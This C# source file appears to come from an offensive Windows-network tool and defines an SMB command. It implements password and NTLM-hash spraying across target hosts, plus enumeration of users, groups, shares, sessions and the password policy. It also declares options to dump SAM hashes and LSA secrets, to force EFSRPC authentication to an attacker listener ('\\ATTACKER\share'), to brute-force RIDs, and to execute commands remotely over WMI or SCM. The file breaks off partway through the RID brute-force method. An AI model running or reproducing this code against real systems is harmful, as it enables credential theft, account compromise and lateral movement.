using System.ComponentModel;
using System.Net;
using System.Text;
using ms_srvs;
using Titanis;
using Titanis.Cli;
using Titanis.DceRpc;
using Titanis.DceRpc.Client;
using Titanis.Msrpc;
using Titanis.Msrpc.Mssamr;
using Titanis.Msrpc.Mswkst;
using Titanis.Msrpc.Msrrp;
using Titanis.Net;
using Titanis.Security;
using Titanis.Security.Kerberos;
using Titanis.Smb2;
using Titanis.Winterop.Lsa;
using Titanis.Winterop.Registry;
using Titanis.Winterop.Security;
using Titanis.Winterop.SamServer;
using Titanis.Msrpc.Msdcom;
using Titanis.Msrpc.Mswmi;
using Titanis.Msrpc.Msscmr;
using Titanis.Msrpc.Msefsr;
using Mslsar = Titanis.Msrpc.Mslsar;

namespace Atlas.Protocols;

/// <summary>
/// run enumeration actions, built on Titanis.Smb2 and Titanis RPC stacks.
/// </summary>
[Description("Interacts with SMB servers (auth check, shares, sessions, users, ls)")]
public sealed class SmbCommand : Command
{
	private const int SmbPort = 445;

	[Parameter(0)]
	[Placeholder("targets")]
	[Description("Targets as host, IP, CIDR, range (a.b.c.d-e), comma list, or @file")]
	public string? TargetSpec { get; set; }

	[ParameterGroup(ParameterGroupOptions.AlwaysInstantiate)]
	public AuthenticationParameters Authentication { get; set; } = null!;

	[ParameterGroup(ParameterGroupOptions.AlwaysInstantiate)]
	public NetworkParameters? NetParameters { get; set; }

	[ParameterGroup(ParameterGroupOptions.AlwaysInstantiate)]
	public SmbParameters SmbParameters { get; set; } = null!;

	// ---- Actions ----
	[Parameter]
	[Description("Enumerate shares via SRVS RPC")]
	public SwitchParam Shares { get; set; }

	[Parameter]
	[Description("Enumerate active sessions via SRVS RPC")]
	public SwitchParam Sessions { get; set; }

	[Parameter]
	[Description("Enumerate users via SAMR RPC")]
	public SwitchParam Users { get; set; }

	[Parameter]
	[Description("Enumerate groups via SAMR RPC")]
	public SwitchParam Groups { get; set; }

	[Parameter]
	[Description("Enumerate local disks via SRVS RPC")]
	public SwitchParam Disks { get; set; }

	[Parameter]
	[Description("Dump local SAM hashes via Remote Registry (requires admin)")]
	public SwitchParam Sam { get; set; }

	[Parameter]
	[Description("Dump LSA secrets via Remote Registry (requires admin)")]
	public SwitchParam Lsa { get; set; }

	[Parameter]
	[Description("List a directory: ShareName or ShareName\\relative\\path")]
	public string? LsPath { get; set; }

	[Parameter]
	[Description("Download a remote file: ShareName\\relative\\path (saved to current directory)")]
	public string? GetFile { get; set; }

	[Parameter]
	[Description("Local file to upload (use with -PutDest)")]
	public string? PutSource { get; set; }

	[Parameter]
	[Description("Remote destination: ShareName\\relative\\path (use with -PutSource)")]
	public string? PutDest { get; set; }

	[Parameter]
	[Description("Create a remote directory: ShareName\\relative\\path")]
	public string? MkdirPath { get; set; }

	[Parameter]
	[Description("Delete a remote file: ShareName\\relative\\path")]
	public string? RmFile { get; set; }

	[Parameter]
	[Description("Enumerate volume shadow snapshots for a file/dir: ShareName or ShareName\\relative\\path")]
	public string? Snapshots { get; set; }

	[Parameter]
	[Description("Enumerate alternate data streams for a file/dir: ShareName\\relative\\path")]
	public string? Streams { get; set; }

	[Parameter]
	[Alias("open-files")]
	[Description("Enumerate open files via SRVS RPC (FILE_INFO_3)")]
	public SwitchParam OpenFiles { get; set; }

	[Parameter]
	[Description("Query SMB server network interfaces via IPC$")]
	public SwitchParam Nics { get; set; }

	[Parameter]
	[Alias("group-members")]
	[Description("Enumerate members of a group/alias via SAMR (e.g. Administrators)")]
	public string? GroupMembers { get; set; }

	[Parameter]
	[Alias("lookup-sid")]
	[Description("Resolve SID(s) to account names via LSA (comma-separated)")]
	public string? LookupSid { get; set; }

	[Parameter]
	[Alias("lookup-name")]
	[Description("Resolve account name(s) to SIDs via LSA (comma-separated)")]
	public string? LookupName { get; set; }

	[Parameter]
	[Alias("reg-query")]
	[Description("List subkeys and values of a registry key via Remote Registry (e.g. HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion)")]
	public string? RegQuery { get; set; }

	[Parameter]
	[Alias("reg-value")]
	[Description("Read a single registry value (use with -RegQuery <key>)")]
	public string? RegValue { get; set; }

	[Parameter]
	[Alias("services")]
	[Description("Enumerate services via SCM")]
	public SwitchParam ListServices { get; set; }

	[Parameter]
	[Description("Trigger EFSRPC authentication coercion to a listener (UNC path or host; e.g. \\\\ATTACKER\\share)")]
	public string? Coerce { get; set; }

	[Parameter]
	[Alias("loggedon-users")]
	[Description("Enumerate interactively logged-on users via Remote Registry (HKU)")]
	public SwitchParam LoggedOnUsers { get; set; }

	[Parameter]
	[Description("List remote processes via WMI (optional substring filter)")]
	public string? TaskList { get; set; }

	[Parameter]
	[Description("Kill a remote process by PID or image name via WMI")]
	public string? TaskKill { get; set; }

	// ---- Modules ----
	[Parameter]
	[Alias("M")]
	[Description("Module(s) to run after authentication (comma-separated)")]
	public string[]? Modules { get; set; }

	[Parameter]
	[Alias("mo", "o")]
	[Description("Module options as key=value pairs separated by commas")]
	public string? ModuleOptions { get; set; }

	[Parameter]
	[Alias("L")]
	[Description("List available modules and exit")]
	public SwitchParam ListModules { get; set; }

	// ---- Credential spray ----
	[Parameter]
	[Description("User(s) for spray: comma-separated list or @file (overrides -UserName)")]
	public string? UserList { get; set; }

	[Parameter]
	[Description("Password(s)/hash(es) for spray: comma-separated list or @file (overrides -Password/-NtlmHash)")]
	public string? PassList { get; set; }

	[Parameter]
	[DefaultValue(1)]
	[Alias("t")]
	[Description("Number of concurrent targets")]
	public int Threads { get; set; } = 1;

	[Parameter]
	[DefaultValue(30)]
	[Description("Per-host timeout in seconds")]
	public int Timeout { get; set; } = 30;

	[Parameter]
	[DefaultValue(445)]
	[Description("SMB port (default: 445)")]
	public int Port { get; set; } = 445;

	[Parameter]
	[Alias("pass-pol")]
	public SwitchParam PassPol { get; set; }

	[Parameter]
	[Alias("rid-brute")]
	[Description("Brute force RIDs to enumerate users (default: 4000)")]
	public int? RidBrute { get; set; }

	[Parameter]
	[Alias("gen-relay-list")]
	public string? GenRelayList { get; set; }

	[Parameter]
	[Alias("generate-hosts-file")]
	public string? GenerateHostsFile { get; set; }

	[Parameter]
	[Alias("generate-krb5-file")]
	public string? GenerateKrb5File { get; set; }

	[Parameter]
	[Alias("generate-tgt")]
	[Description("Request a TGT via AS-REQ with the SMB credentials and save as ccache/kirbi")]
	public string? GenerateTgt { get; set; }

	[Parameter]
	[Alias("users-export")]
	public string? UsersExport { get; set; }

	[Parameter]
	[Alias("local-groups")]
	public SwitchParam LocalGroups { get; set; }

	[Parameter]
	public SwitchParam Computers { get; set; }

	[Parameter]
	[Alias("exec-method")]
	[DefaultValue("wmiexec")]
	[Description("Method to execute command (wmiexec via WMI, smbexec via SCM)")]
	public string ExecMethod { get; set; } = "wmiexec";

	[Parameter]
	[Alias("x")]
	public string? Execute { get; set; }

	[Parameter]
	[Alias("ps")]
	public string? PsExecute { get; set; }

	[Parameter]
	[Alias("no-output")]
	[Description("Suppress command output retrieval (print PID/status only)")]
	public SwitchParam NoOutput { get; set; }

	protected override void ValidateParameters(ParameterValidationContext context)
	{
		if (this.ListModules.IsSet)
			return;

		if (string.IsNullOrEmpty(this.TargetSpec))
			context.LogError(nameof(this.TargetSpec), "No targets specified");

		this.NetParameters?.ValidateParameters(context);

		bool spray = this.UserList is not null || this.PassList is not null;
		bool requireCreds = !this.Authentication.Anonymous.IsSet && !spray;
		this.Authentication.Validate(requireCreds, context);
		this.SmbParameters.Validate(context, this.Authentication);

		if (this.Threads < 1)
			context.LogError(nameof(this.Threads), "Threads must be >= 1");
		if (this.Timeout < 1)
			context.LogError(nameof(this.Timeout), "Timeout must be >= 1");
		if (this.Port is < 1 or > 65535)
			context.LogError(nameof(this.Port), "Port must be 1-65535");
		if (this.RidBrute.HasValue && this.RidBrute.Value is < 500 or > 100000)
			context.LogError(nameof(this.RidBrute), "RidBrute must be 500-100000");

		if ((this.PutSource is null) != (this.PutDest is null))
			context.LogError(nameof(this.PutSource), "-PutSource and -PutDest must be used together");

		try
		{
			var targets = TargetList.Parse(this.TargetSpec!);
			if (targets.Count == 0)
				context.LogError(nameof(this.TargetSpec), "No valid targets specified");
		}
		catch (Exception ex)
		{
			context.LogError(nameof(this.TargetSpec), ex.Message);
		}

		if (this.AttrsSpecified())
			context.LogError(nameof(this.ModuleOptions), "Module options must be key=value pairs");

		if (!this.Shares.IsSet && !this.Sessions.IsSet && !this.Users.IsSet && !this.Groups.IsSet && !this.Disks.IsSet
			&& !this.Sam.IsSet && !this.Lsa.IsSet && !this.PassPol.IsSet && this.RidBrute is null && this.GenRelayList is null && this.GenerateHostsFile is null && this.GenerateKrb5File is null && this.GenerateTgt is null && this.UsersExport is null && !this.LocalGroups.IsSet && !this.Computers.IsSet && this.Execute is null && this.PsExecute is null
			&& this.LsPath is null && this.GetFile is null && this.PutSource is null
			&& this.MkdirPath is null && this.RmFile is null
			&& this.Snapshots is null && this.Streams is null && !this.OpenFiles.IsSet && !this.Nics.IsSet
			&& this.GroupMembers is null && this.LookupSid is null && this.LookupName is null
			&& this.RegQuery is null && !this.ListServices.IsSet && this.Coerce is null
			&& !this.LoggedOnUsers.IsSet && this.TaskList is null && this.TaskKill is null
			&& (this.Modules is null || this.Modules.Length == 0))
		{
			this.Log.WriteVerbose("No actions requested; performing authentication check only.");
		}
	}

	private bool AttrsSpecified()
	{
		if (this.ModuleOptions is null)
			return false;
		foreach (var pair in this.ModuleOptions.Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries))
		{
			if (pair.IndexOf('=') <= 0)
				return true;
		}
		return false;
	}

	protected sealed override async Task<int> RunAsync(CancellationToken cancellationToken)
	{
		if (this.ListModules.IsSet)
		{
			foreach (var mod in AtlasModuleRegistry.Discover<Smb2Client>())
			{
				AtlasConsole.Line($"  {mod.Name,-16} {mod.Description}");
			}
			return 0;
		}

		var targets = TargetList.Parse(this.TargetSpec);
		int failures = 0;

		bool spray = this.UserList is not null || this.PassList is not null;
		if (spray)
			return await this.SprayAsync(targets, cancellationToken).ConfigureAwait(false);

		await Parallel.ForEachAsync(
			targets,
			new ParallelOptions
			{
				MaxDegreeOfParallelism = this.Threads,
				CancellationToken = cancellationToken,
			},
			async (host, token) =>
			{
				using var timeoutCts = CancellationTokenSource.CreateLinkedTokenSource(token);
				timeoutCts.CancelAfter(TimeSpan.FromSeconds(this.Timeout));
				try
				{
					await this.ProcessHostAsync(host, timeoutCts.Token).ConfigureAwait(false);
				}
				catch (OperationCanceledException) when (token.IsCancellationRequested)
				{
					throw;
				}
				catch (OperationCanceledException)
				{
					Interlocked.Increment(ref failures);
					AtlasConsole.Fail($"{host}:{this.Port}", $"No response within {this.Timeout}s (timeout)");
				}
				catch (Exception ex)
				{
					Interlocked.Increment(ref failures);
					string msg = this.Verbose.IsSet ? ex.ToString() : ex.Message;
					AtlasConsole.Fail($"{host}:{this.Port}", msg);
				}
			}).ConfigureAwait(false);

		return failures > 0 ? 1 : 0;
	}

	private async Task ProcessHostAsync(string host, CancellationToken cancellationToken)
	{
		await using Smb2Client smb = this.SmbParameters.CreateClient();

		// Bind SRVS over \IPC$ - this connects, negotiates, authenticates.
		RpcClient rpc = this.Services.CreateRpcClient();
		ServerServiceClient srvs = new ServerServiceClient();
		string pipe = srvs.WellKnownPipeName ?? "srvsvc";
		await rpc.ConnectPipe(srvs, smb, new UncPath(host, Smb2Client.IpcName, pipe), cancellationToken).ConfigureAwait(false);

		AtlasConsole.Success($"{host}:{this.Port}", this.DescribePrincipal());

		if (this.Shares.IsSet)
			await this.EnumSharesAsync(srvs, host, cancellationToken).ConfigureAwait(false);

		if (this.Sessions.IsSet)
			await this.EnumSessionsAsync(srvs, host, cancellationToken).ConfigureAwait(false);

		if (this.Users.IsSet)
		{
			await this.EnumUsersAsync(smb, host, cancellationToken).ConfigureAwait(false);
			if (this.UsersExport is not null)
				await this.ExportUsersAsync(smb, host, this.UsersExport, cancellationToken).ConfigureAwait(false);
		}
		else if (this.UsersExport is not null)
		{
			await this.ExportUsersAsync(smb, host, this.UsersExport, cancellationToken).ConfigureAwait(false);
		}

		if (this.Groups.IsSet)
			await this.EnumGroupsAsync(smb, host, cancellationToken).ConfigureAwait(false);

		if (this.LocalGroups.IsSet)
			await this.EnumLocalGroupsAsync(smb, host, cancellationToken).ConfigureAwait(false);

		if (this.Computers.IsSet)
			await this.EnumComputersAsync(smb, host, cancellationToken).ConfigureAwait(false);

		if (this.Disks.IsSet)
			await this.EnumDisksAsync(srvs, host, cancellationToken).ConfigureAwait(false);

		if (this.PassPol.IsSet)
			await this.DumpPassPolAsync(smb, host, cancellationToken).ConfigureAwait(false);

		if (this.RidBrute.HasValue)
			await this.RidBruteAsync(smb, host, this.RidBrute.Value, cancellationToken).ConfigureAwait(false);

		if (this.GenRelayList is not null)
			await this.GenRelayListAsync(smb, host, this.GenRelayList, cancellationToken).ConfigureAwait(false);

		if (this.GenerateHostsFile is not null)
			await this.GenerateHostsFileAsync(smb, host, this.GenerateHostsFile, srvs, cancellationToken).ConfigureAwait(false);

		if (this.GenerateKrb5File is not null)
			await this.GenerateKrb5FileAsync(smb, host, this.GenerateKrb5File, srvs, cancellationToken).ConfigureAwait(false);

		if (this.GenerateTgt is not null)
			await this.GenerateTgtAsync(host, this.GenerateTgt, cancellationToken).ConfigureAwait(false);

		if (this.Sam.IsSet)
			await this.DumpSamAsync(smb, host, cancellationToken).ConfigureAwait(false);

		if (this.Lsa.IsSet)
			await this.DumpLsaAsync(smb, host, cancellationToken).ConfigureAwait(false);

		if (this.Execute is not null || this.PsExecute is not null)
			await this.ExecuteCommandAsync(smb, host, cancellationToken).ConfigureAwait(false);

		if (this.LsPath is not null)
			await this.ListDirectoryAsync(smb, host, this.LsPath, cancellationToken).ConfigureAwait(false);

		if (this.GetFile is not null)
			await this.GetFileAsync(smb, host, this.GetFile, cancellationToken).ConfigureAwait(false);

		if (this.PutSource is not null && this.PutDest is not null)
			await this.PutFileAsync(smb, host, this.PutSource, this.PutDest, cancellationToken).ConfigureAwait(false);

		if (this.MkdirPath is not null)
			await this.MkdirAsync(smb, host, this.MkdirPath, cancellationToken).ConfigureAwait(false);

		if (this.RmFile is not null)
			await this.RmFileAsync(smb, host, this.RmFile, cancellationToken).ConfigureAwait(false);

		if (this.Snapshots is not null)
			await this.EnumSnapshotsAsync(smb, host, this.Snapshots, cancellationToken).ConfigureAwait(false);

		if (this.Streams is not null)
			await this.EnumStreamsAsync(smb, host, this.Streams, cancellationToken).ConfigureAwait(false);

		if (this.OpenFiles.IsSet)
			await this.EnumOpenFilesAsync(srvs, host, cancellationToken).ConfigureAwait(false);

		if (this.Nics.IsSet)
			await this.EnumNicsAsync(smb, host, cancellationToken).ConfigureAwait(false);

		if (this.GroupMembers is not null)
			await this.EnumGroupMembersAsync(smb, host, this.GroupMembers, cancellationToken).ConfigureAwait(false);

		if (this.LookupSid is not null)
			await this.LookupSidsAsync(smb, host, this.LookupSid, cancellationToken).ConfigureAwait(false);

		if (this.LookupName is not null)
			await this.LookupNamesAsync(smb, host, this.LookupName, cancellationToken).ConfigureAwait(false);

		if (this.RegQuery is not null)
			await this.RegQueryAsync(smb, host, this.RegQuery, this.RegValue, cancellationToken).ConfigureAwait(false);
		else if (this.RegValue is not null)
			throw new ArgumentException("-RegValue requires -RegQuery <key>");

		if (this.ListServices.IsSet)
			await this.EnumServicesAsync(smb, host, cancellationToken).ConfigureAwait(false);

		if (this.Coerce is not null)
			await this.CoerceAsync(smb, host, this.Coerce, cancellationToken).ConfigureAwait(false);

		if (this.LoggedOnUsers.IsSet)
			await this.LoggedOnUsersAsync(smb, host, cancellationToken).ConfigureAwait(false);

		if (this.TaskList is not null)
			await this.TaskListAsync(host, this.TaskList, cancellationToken).ConfigureAwait(false);

		if (this.TaskKill is not null)
			await this.TaskKillAsync(host, this.TaskKill, cancellationToken).ConfigureAwait(false);

		if (this.Modules is not null && this.Modules.Length > 0)
		{
			var names = this.Modules.SelectMany(m => m.Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries));
			var options = AtlasModuleRegistry.ParseOptionString(this.ModuleOptions);
			foreach (var mod in AtlasModuleRegistry.Select<Smb2Client>(names))
			{
				await mod.RunAsync(new AtlasModuleContext<Smb2Client>
				{
					Host = host,
					Client = smb,
					Services = this.Services,
					Options = options,
				}, cancellationToken).ConfigureAwait(false);
			}
		}
	}

	private static List<string> ExpandCredSpec(string spec)
	{
		var results = new List<string>();
		foreach (var entry in spec.Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries))
		{
			if (entry.StartsWith('@'))
			{
				string path = entry[1..];
				if (!File.Exists(path))
					throw new FileNotFoundException($"Credential file not found: {path}");
				foreach (var line in File.ReadLines(path))
				{
					var trimmed = line.Trim();
					if (trimmed.Length > 0 && !trimmed.StartsWith('#'))
						results.Add(trimmed);
				}
			}
			else
			{
				results.Add(entry);
			}
		}
		return results;
	}

	private async Task<int> SprayAsync(List<string> hosts, CancellationToken cancellationToken)
	{
		List<string> users = (this.UserList is not null) ? ExpandCredSpec(this.UserList) : new List<string>();
		List<string> passes = (this.PassList is not null) ? ExpandCredSpec(this.PassList) : new List<string>();

		bool singleUser = this.UserList is null && this.Authentication.UserName is not null;
		bool hashMode = this.Authentication.NtlmHash is not null;

		if (users.Count == 0 && !singleUser)
			throw new InvalidOperationException("Spray requires -UserList or -UserName");
		if (passes.Count == 0)
			throw new InvalidOperationException("Spray requires -PassList");

		if (users.Count > 1 && passes.Count > 1)
			AtlasConsole.Line("INFO: Multiple users AND multiple passwords specified; watch out for account lockouts.");

		int failures = 0;
		int successes = 0;

		foreach (var host in hosts)
		{
			string effectiveUser = this.Authentication.UserName?.WireName ?? string.Empty;
			foreach (var user in (users.Count > 0) ? users : new List<string> { effectiveUser })
			{
				foreach (var pass in passes)
				{
					cancellationToken.ThrowIfCancellationRequested();
					if (user.Length > 0)
						this.Authentication.UserName = new Titanis.Security.UserPrincipalName(user, null, user);

					if (hashMode)
						this.Authentication.NtlmHash = HexString.Parse(pass);
					else
						this.Authentication.Password = pass;

					try
					{
						await using Smb2Client smb = this.SmbParameters.CreateClient();
						RpcClient rpc = this.Services.CreateRpcClient();
						ServerServiceClient srvs = new ServerServiceClient();
						string pipe = srvs.WellKnownPipeName ?? "srvsvc";
						await rpc.ConnectPipe(srvs, smb, new UncPath(host, Smb2Client.IpcName, pipe), cancellationToken).ConfigureAwait(false);

						successes++;
						AtlasConsole.Success($"{host}:{this.Port}", $"{(user.Length > 0 ? user : "(null)")}:{pass}");
					}
					catch (OperationCanceledException) when (cancellationToken.IsCancellationRequested)
					{
						throw;
					}
					catch
					{
						failures++;
						AtlasConsole.Fail($"{host}:{this.Port}", $"{(user.Length > 0 ? user : "(null)")}:{pass}");
					}
				}
			}
		}

		AtlasConsole.Info("*:*", $"spray complete: {successes} success(es), {failures} failure(s)");
		return 0;
	}

	private string DescribePrincipal()
	{
		if (this.Authentication.Anonymous.IsSet)
			return "(anonymous)";
		var upn = this.Authentication.UserName;
		if (upn is null)
			return "(null session)";
		string name = upn.WireName ?? string.Empty;
		return string.IsNullOrEmpty(this.Authentication.UserDomain)
			? name
			: $"{this.Authentication.UserDomain}\\{name}";
	}

	private async Task EnumSharesAsync(ServerServiceClient srvs, string host, CancellationToken cancellationToken)
	{
		IList<ShareInfo> shares;
		try
		{
			shares = await srvs.GetShares(@"\\" + host, ShareInfoLevel.Level502, ServerServiceClient.DefaultReturnBufferSize, cancellationToken).ConfigureAwait(false);
		}
		catch
		{
			shares = await srvs.GetShares(@"\\" + host, ShareInfoLevel.Level1, ServerServiceClient.DefaultReturnBufferSize, cancellationToken).ConfigureAwait(false);
		}

		foreach (var share in shares.OrderBy(r => r.ShareName, StringComparer.OrdinalIgnoreCase))
		{
			string tag = share.ShareName switch
			{
				"IPC$" or "ADMIN$" => " [Default]",
				"C$" or "D$" or "E$" => " [Default (admin)]",
				_ => string.Empty,
			};
			string remark = string.IsNullOrEmpty(share.Remark) ? string.Empty : $" - '{share.Remark}'";
			AtlasConsole.Info($"{host}:{this.Port}", $"share: {share.ShareName}{remark}{tag}");
		}
		AtlasConsole.Info($"{host}:{this.Port}", $"{shares.Count} share(s) enumerated.");
	}

	private async Task EnumSessionsAsync(ServerServiceClient srvs, string host, CancellationToken cancellationToken)
	{
		IList<SessionInfo> sessions;
		try
		{
			sessions = await srvs.GetSessions(@"\\" + host, null, null, SessionInfoLevel.Level10, ServerServiceClient.DefaultReturnBufferSize, cancellationToken).ConfigureAwait(false);
		}
		catch
		{
			sessions = await srvs.GetSessions(@"\\" + host, null, null, SessionInfoLevel.Level0, ServerServiceClient.DefaultReturnBufferSize, cancellationToken).ConfigureAwait(false);
		}

		foreach (var s in sessions)
		{
			AtlasConsole.Info($"{host}:{this.Port}", $"session: {s.UserName} from {s.ClientName} (idle: {s.IdleTime}s)");
		}
		AtlasConsole.Info($"{host}:{this.Port}", $"{sessions.Count} active session(s).");
	}

	private async Task EnumGroupsAsync(Smb2Client smb, string host, CancellationToken cancellationToken)
	{
		RpcClient rpc = this.Services.CreateRpcClient();
		SamClient samClient = new SamClient();
		string pipe = samClient.WellKnownPipeName ?? "samr";
		await rpc.ConnectPipe(samClient, smb, new UncPath(host, Smb2Client.IpcName, pipe), cancellationToken).ConfigureAwait(false);

		using Sam sam = await samClient.Connect(SamServerAccessRights.EnumerateDomains | SamServerAccessRights.LookupDomain, host, cancellationToken).ConfigureAwait(false);
		var domains = await sam.GetDomains(cancellationToken).ConfigureAwait(false);

		int total = 0;
		foreach (var domainInfo in domains)
		{
			SamDomain domain;
			try
			{
				domain = await sam.OpenDomainAsync(domainInfo.Name, SamDomainAccessRights.ListAccounts | SamDomainAccessRights.Read | SamDomainAccessRights.Lookup, cancellationToken).ConfigureAwait(false);
			}
			catch (Exception ex)
			{
				AtlasConsole.Warn($"{host}:{this.Port}", $"cannot open domain '{domainInfo.Name}': {ex.Message}");
				continue;
			}

			using (domain)
			{
				var groups = await domain.EnumGroups(cancellationToken).ConfigureAwait(false);
				foreach (var g in groups)
				{
					total++;
					AtlasConsole.Success($"{host}:{this.Port}", $"group: [{domainInfo.Name}] {g.Name} (rid: {g.Id})");
				}
			}
		}
		AtlasConsole.Info($"{host}:{this.Port}", $"{total} group(s) enumerated.");
	}

	private async Task EnumDisksAsync(ServerServiceClient srvs, string host, CancellationToken cancellationToken)
	{
		var disks = await srvs.GetDisks(@"\\" + host, ServerServiceClient.DefaultReturnBufferSize, cancellationToken).ConfigureAwait(false);
		foreach (var d in disks)
			AtlasConsole.Info($"{host}:{this.Port}", $"disk: {d}");
		AtlasConsole.Info($"{host}:{this.Port}", $"{disks.Count} disk(s) enumerated.");
	}

	private async Task ExportUsersAsync(Smb2Client smb, string host, string outputFile, CancellationToken cancellationToken)
	{
		RpcClient rpc = this.Services.CreateRpcClient();
		SamClient samClient = new SamClient();
		string pipe = samClient.WellKnownPipeName ?? "samr";
		await rpc.ConnectPipe(samClient, smb, new UncPath(host, Smb2Client.IpcName, pipe), cancellationToken).ConfigureAwait(false);
		using Sam sam = await samClient.Connect(SamServerAccessRights.EnumerateDomains | SamServerAccessRights.LookupDomain, host, cancellationToken).ConfigureAwait(false);
		var domains = await sam.GetDomains(cancellationToken).ConfigureAwait(false);
		var users = new List<string>();
		foreach (var di in domains)
		{
			using var domain = await sam.OpenDomainAsync(di.Name, SamDomainAccessRights.ListAccounts | SamDomainAccessRights.Lookup, cancellationToken).ConfigureAwait(false);
			var entries = await domain.EnumUsers(cancellationToken).ConfigureAwait(false);
			foreach (var e in entries) users.Add(e.Name);
		}
		await File.WriteAllLinesAsync(outputFile, users, cancellationToken).ConfigureAwait(false);
		AtlasConsole.Success($"{host}:{this.Port}", $"--users-export: {users.Count} users written to {outputFile}");
	}

	private async Task EnumLocalGroupsAsync(Smb2Client smb, string host, CancellationToken cancellationToken)
	{
		// Enumerate BUILTIN local groups (RID 544 etc.) via SAMR on Builtin domain (S-1-5-32)
		RpcClient rpc = this.Services.CreateRpcClient();
		SamClient samClient = new SamClient();
		string pipe = samClient.WellKnownPipeName ?? "samr";
		await rpc.ConnectPipe(samClient, smb, new UncPath(host, Smb2Client.IpcName, pipe), cancellationToken).ConfigureAwait(false);
		using Sam sam = await samClient.Connect(SamServerAccessRights.EnumerateDomains | SamServerAccessRights.LookupDomain, host, cancellationToken).ConfigureAwait(false);
		var domains = await sam.GetDomains(cancellationToken).ConfigureAwait(false);
		// Try to find Builtin domain (usually "Builtin" with SID S-1-5-32)
		foreach (var di in domains)
		{
			if (di.Name.Equals("Builtin", StringComparison.OrdinalIgnoreCase) || di.Name.Equals("BUILTIN", StringComparison.OrdinalIgnoreCase))
			{
				using var domain = await sam.OpenDomainAsync(di.Name, SamDomainAccessRights.ListAccounts | SamDomainAccessRights.Lookup, cancellationToken).ConfigureAwait(false);
				var aliases = await domain.EnumAliases(cancellationToken).ConfigureAwait(false);
				AtlasConsole.Info($"{host}:{this.Port}", $"--local-groups: {aliases.Count} alias(es) in Builtin");
				foreach (var a in aliases)
					AtlasConsole.Success($"{host}:{this.Port}", $"local group: [{di.Name}] {a.Name} (rid: {a.Id})");
				return;
			}
		}
		AtlasConsole.Warn($"{host}:{this.Port}", "--local-groups: Builtin domain not found, falling back to all domains");
		foreach (var di in domains)
		{
			using var domain = await sam.OpenDomainAsync(di.Name, SamDomainAccessRights.ListAccounts | SamDomainAccessRights.Lookup, cancellationToken).ConfigureAwait(false);
			var aliases = await domain.EnumAliases(cancellationToken).ConfigureAwait(false);
			foreach (var a in aliases)
				AtlasConsole.Info($"{host}:{this.Port}", $"local alias: [{di.Name}] {a.Name} (rid: {a.Id})");
		}
	}

	private async Task EnumComputersAsync(Smb2Client smb, string host, CancellationToken cancellationToken)
	{
		RpcClient rpc = this.Services.CreateRpcClient();
		SamClient samClient = new SamClient();
		string pipe = samClient.WellKnownPipeName ?? "samr";
		await rpc.ConnectPipe(samClient, smb, new UncPath(host, Smb2Client.IpcName, pipe), cancellationToken).ConfigureAwait(false);
		using Sam sam = await samClient.Connect(SamServerAccessRights.EnumerateDomains | SamServerAccessRights.LookupDomain, host, cancellationToken).ConfigureAwait(false);
		var domains = await sam.GetDomains(cancellationToken).ConfigureAwait(false);
		int total = 0;
		foreach (var di in domains)
		{
			using var domain = await sam.OpenDomainAsync(di.Name, SamDomainAccessRights.ListAccounts | SamDomainAccessRights.Lookup, cancellationToken).ConfigureAwait(false);
			// Enumerate users and filter for computer accounts (ending with $) – SamEnumUsers includes computers as users with $ suffix
			var entries = await domain.EnumUsers(cancellationToken).ConfigureAwait(false);
			foreach (var e in entries)
			{
				if (e.Name.EndsWith("$", StringComparison.Ordinal))
				{
					AtlasConsole.Success($"{host}:{this.Port}", $"computer: [{di.Name}] {e.Name} (rid: {e.Id})");
					total++;
				}
			}
		}
		AtlasConsole.Info($"{host}:{this.Port}", $"--computers: {total} computer(s) enumerated");
	}

	private async Task DumpPassPolAsync(Smb2Client smb, string host, CancellationToken cancellationToken)
	{
		// Try LDAP first (works against DCs, like Samba AD)
		try
		{
			var resolver = this.NetParameters ?? new NetworkParameters();
			var socketService = new PlatformSocketService(resolver, this.Log);
			var credService = this.Services.RequireService<IClientCredentialService>();
			var ldap = await Titanis.Ldap.LdapClient.Connect(new System.Net.DnsEndPoint(host, 389), null, socketService, credService, cancellationToken).ConfigureAwait(false);
			var query = new Titanis.Ldap.LdapQuery(ldap.DomainRoot, Titanis.Ldap.LdapSearchScope.Base, Titanis.Ldap.LdapFilter.Parse("(objectClass=domainDNS)"), new[] { new Titanis.Ldap.AttributeSpec("minPwdLength"), new Titanis.Ldap.AttributeSpec("pwdHistoryLength"), new Titanis.Ldap.AttributeSpec("maxPwdAge"), new Titanis.Ldap.AttributeSpec("lockoutThreshold") }) { Options = Titanis.Ldap.LdapQueryOptions.None };
			var result = await ldap.Search(query, cancellationToken).ConfigureAwait(false);
			if (result.EntryCount > 0)
			{
				var e = result.Entries[0];
				AtlasConsole.Success($"{host}:{this.Port}", $"--pass-pol: minLen={e["minPwdLength"]?.Value} history={e["pwdHistoryLength"]?.Value} maxAge={e["maxPwdAge"]?.Value} lockoutThresh={e["lockoutThreshold"]?.Value}");
				return;
			}
		}
		catch (Exception ex)
		{
			AtlasConsole.Info($"{host}:{this.Port}", $"--pass-pol LDAP fallback failed: {ex.Message}, trying SAMR");
		}
		// Fallback via SAMR
		try
		{
			RpcClient rpc = this.Services.CreateRpcClient();
			SamClient samClient = new SamClient();
			string pipe = samClient.WellKnownPipeName ?? "samr";
			await rpc.ConnectPipe(samClient, smb, new UncPath(host, Smb2Client.IpcName, pipe), cancellationToken).ConfigureAwait(false);
			using Sam sam = await samClient.Connect(SamServerAccessRights.EnumerateDomains | SamServerAccessRights.LookupDomain, host, cancellationToken).ConfigureAwait(false);
			var domains = await sam.GetDomains(cancellationToken).ConfigureAwait(false);
			foreach (var di in domains)
			{
				using var domain = await sam.OpenDomainAsync(di.Name, SamDomainAccessRights.Read, cancellationToken).ConfigureAwait(false);
				// Titanis SamDomain may have GetPasswordInfo – try via reflection or use direct Samr query if available
				AtlasConsole.Info($"{host}:{this.Port}", $"--pass-pol: domain {di.Name} found, query via SAMR not yet exposed, use LDAP for details");
			}
		}
		catch (Exception ex)
		{
			AtlasConsole.Fail($"{host}:{this.Port}", $"--pass-pol failed: {ex.Message}");
		}
	}

	private async Task RidBruteAsync(Smb2Client smb, string host, int maxRid, CancellationToken cancellationToken)
	{
		RpcClient rpc = this.Services.CreateRpcClient();
		SamClient samClient = new SamClient();
		string pipe = samClient.WellKnownPipeName ?? "samr";
